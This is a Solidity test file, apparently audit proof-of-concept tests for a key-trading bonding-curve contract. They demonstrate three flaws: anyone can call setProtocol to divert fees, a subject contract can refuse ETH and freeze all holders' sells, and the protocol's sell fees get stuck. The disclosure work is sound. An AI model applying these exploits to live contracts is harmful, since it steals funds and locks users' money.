// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {Keys} from "../src/Keys.sol";

// A subject account that is a contract and can stop accepting ETH.
contract Subject {
    Keys keys;
    bool public closed;
    constructor(Keys k) { keys = k; }
    function buyFirst() external { keys.buy(address(this)); }
    function close() external { closed = true; }
    receive() external payable { require(!closed, "closed"); }
}

contract KeysProof is Proof {
    Keys keys;
    address deployer = address(0xD3);
    address alice = address(0xA11CE);
    address mallory = address(0x3A11);
    address creator = address(0xC4EA);

    function setUp() public {
        vm.prank(deployer);
        keys = new Keys();
        vm.deal(alice, 100 ether);
        vm.deal(mallory, 1 ether);
        vm.deal(creator, 1 ether);
    }

    function cost(uint256 s) internal view returns (uint256) {
        uint256 p = keys.price(s);
        return p + p / 10;
    }

    function aliceBuys(address subject, uint256 n) internal {
        for (uint256 i = 0; i < n; i++) {
            uint256 c = cost(keys.supply(subject));
            vm.prank(alice);
            keys.buy{value: c}(subject);
        }
    }

    // Issue 1: setProtocol has no access check, so anyone can take the protocol's fees.
    function test_issue1_anyoneRedirectsProtocolFees() public {
        vm.prank(creator);
        keys.buy(creator); // first key is free
        vm.prank(mallory);
        keys.setProtocol(mallory);
        uint256 before = mallory.balance;
        aliceBuys(creator, 5);
        assertGt(mallory.balance - before, 0, "protocol fee went to mallory");
        assertEq(deployer.balance, 0, "deployer got nothing");
        assertEq(mallory.balance - before, (keys.price(1) + keys.price(2) + keys.price(3) + keys.price(4) + keys.price(5)) / 20, "all five buy fees");
    }

    // Issue 2: every sell pushes the subject's fee to the subject; a subject that is a
    // contract can stop accepting ETH and freeze every holder's exit.
    function test_issue2_subjectFreezesSells() public {
        Subject sub = new Subject(keys);
        sub.buyFirst();
        aliceBuys(address(sub), 3);
        uint256 locked = address(keys).balance;
        assertGt(locked, 0, "alice's purchase price sits in the curve");
        sub.close();
        vm.prank(alice);
        vm.expectRevert();
        keys.sell(address(sub));
        assertEq(keys.keys(address(sub), alice), 3, "alice cannot sell any of her keys");
        assertEq(address(keys).balance, locked, "her ETH stays in the contract");
    }

    function test_issue2_control_openSubjectSells() public {
        Subject sub = new Subject(keys);
        sub.buyFirst();
        aliceBuys(address(sub), 3);
        vm.prank(alice);
        keys.sell(address(sub));
        assertEq(keys.keys(address(sub), alice), 2, "sell works while the subject accepts ETH");
    }

    // Issue 3: sell deducts 10% from the seller but sends only the subject's 5%; the
    // protocol's 5% stays in the contract and no function can move it.
    function test_issue3_sellProtocolFeeIsStuck() public {
        vm.prank(creator);
        keys.buy(creator);
        aliceBuys(creator, 2); // supply 3: prices 1e14 and 4e14 paid into the curve
        uint256 protocolAfterBuys = deployer.balance;
        vm.prank(alice);
        keys.sell(creator); // at price(2)
        vm.prank(alice);
        keys.sell(creator); // at price(1)
        assertEq(keys.supply(creator), 1, "only the unsellable first key is left");
        assertEq(deployer.balance, protocolAfterBuys, "protocol received nothing from the sells");
        uint256 stuck = (keys.price(2) + keys.price(1)) / 20;
        assertEq(address(keys).balance, stuck, "the protocol's sell fees are stranded in the contract");
        assertGt(stuck, 0, "nonzero");
    }
}
